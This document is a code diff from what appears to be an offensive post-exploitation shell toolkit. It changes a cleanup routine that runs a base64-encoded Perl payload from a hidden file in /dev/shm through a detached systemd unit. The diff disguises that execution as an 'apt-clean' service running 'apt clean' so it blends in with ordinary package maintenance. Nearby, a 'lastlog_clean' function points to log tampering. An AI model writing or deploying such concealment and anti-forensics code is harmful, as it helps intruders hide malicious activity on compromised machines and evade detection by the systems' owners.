@@ -1616,7 +1616,8 @@ _hs_sshd_clean_on_exit() {
     [[ -n $_HS_SSHD_TRIM_ON_EXIT ]] || return
     local script_b64
     script_b64=$(printf '%s' "$_CS" | base64 -w0)
-    echo "/usr/bin/perl -e '"'use MIME::Base64; sleep 2; eval decode_base64($ENV{_CS}); die $@ if $@'"'"$'\n'"rm -f /dev/shm/.apt.$UID" >"/dev/shm/.apt.$UID"
+    echo "apt() { :;}"$'\n'"/usr/bin/perl -e '"'use MIME::Base64; sleep 2; eval decode_base64($ENV{_CS}); die $@ if $@'"'"$'\n'"rm -f /dev/shm/.apt.$UID" >"/dev/shm/.apt.$UID"
+    systemctl reset-failed apt-clean.service 2>/dev/null
     systemd-run --no-block --quiet \
         --unit="apt-clean" \
         --property=StandardOutput=null \
@@ -1625,7 +1626,7 @@ _hs_sshd_clean_on_exit() {
         --setenv=_PID="$_HS_SSHD_TRIM_ON_EXIT" \
         --setenv=_CS="$script_b64" \
         --setenv=ENV=/dev/shm/.apt."$UID" \
-        /bin/sh -ic :
+        /bin/sh -ic apt clean
 }
 
 lastlog_clean() {
